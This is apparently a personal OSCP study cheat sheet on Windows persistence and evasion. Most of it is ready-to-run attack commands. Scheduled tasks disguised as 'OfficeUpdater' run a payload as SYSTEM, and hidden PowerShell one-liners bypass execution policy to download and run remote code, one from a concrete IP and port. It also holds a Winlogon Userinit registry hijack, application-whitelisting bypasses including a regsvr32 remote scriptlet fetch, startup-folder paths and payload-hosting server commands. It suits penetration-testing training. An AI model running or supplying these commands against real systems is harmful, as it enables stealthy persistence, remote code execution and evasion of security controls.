# my OSCP_note




#Persistence

##### SCHTASKS


```	
	#On System Startup
	schtasks /create /TN OfficeUpdaterA /tr ""c:\evil32.exe" -k password -n services" /SC onstart /RU system /RL HIGHEST
	schtasks /create /TN OfficeUpdaterD /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onstart /RU system /RL HIGHEST
	
	#On User Login
	schtasks /create /TN OfficeUpdaterB /tr ""c:\evil32.exe" -k password -n services" /SC onlogon
	schtasks /create /TN OfficeUpdaterE /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onlogon	

	#On Idle
	schtasks /create /TN OfficeUpdaterC /tr ""c:\evil32.exe" -k password -n services" /SC onidle /i 30''''
	schtasks /create /TN OfficeUpdaterF /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onidle /i 60
```


#### Download & Execute (Persistence)

```
	#(X86) - On User Login
	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
 
	#(X86) - On System Start
	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
 
	#(X86) - On User Idle (30mins)
	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onidle /i 30
 
	#(X64) - On User Login
	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
 
	#(X64) - On System Start
	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
 
	#(X64) - On User Idle (30mins)
	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```


//Reestr

```	
	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
	HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit = (REG_SZ) C:\windows\system32\userinit.exe,c:\windows\badprogram.exe
```



##### Application Whitelisting Bypass Techniques

```

1. IEExec -This technique may work in certain environments.  Its relies on the fact that many organizations trust executables signed
by Microsoft.  We can misuse this trust by launching a specially crafted .NET application. 
Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

2.  Rundll32.exe

3.  ClickOnce Applications dfsvc.exe dfshim.dll

4.  XBAP - XML Browser Applications WPF PresentationHost.exe

5.  MD5 Hash Collision 
http://www.mathstat.dal.ca/~selinger/md5collision/

6.  PowerShell - Specifically Reflective Execution
http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

7. .HTA Application Invoke PowerShell Scripts
    Launched by mshta.exe, bypasses IE security settings as well.

8.  bat, vbs, ps1
    1. cmd.exe /k < script.txt
    2. cscript.exe //E:vbscript script.txt
    3. Get-Content script.txt | iex
    
9. Malicious Troubleshooting packs - MSDT.exe
    Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
    Thanks to @nberthaume, @Killswitch_GUI 
    
10. InstallUtil.exe
    A signed MS binary that loads assemblies and executes - One of the best.
    Examples here: https://gist.github.com/subTee

11. Regsvcs/Regasm
    See: https://gist.github.com/subTee/fb09ef511e592e6f7993
    These 2 are Excellent.

12. regsvr32.exe 
    https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
    This one is just simply amazing... 
    regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

13. Msbuild.exe
    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
```

#### Startup Folders (Путь к папкам автозапуск)
```	
	#All Users - Windows XP
	C:\Documents and Settings\All Users\Start Menu\Programs\Startup

	#All Users - Windows Vista+
	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

	#User Profile - Windows XP
	C:\Documents and Settings\<USERNAME>\Start Menu\Programs\Startup

	#User Profile - Windows Vista+
	C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```


#up my server

#### Linux

```

python -m SimpleHTTPServer 80

python3 -m http.server

ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"

php -S 0.0.0.0:80

```

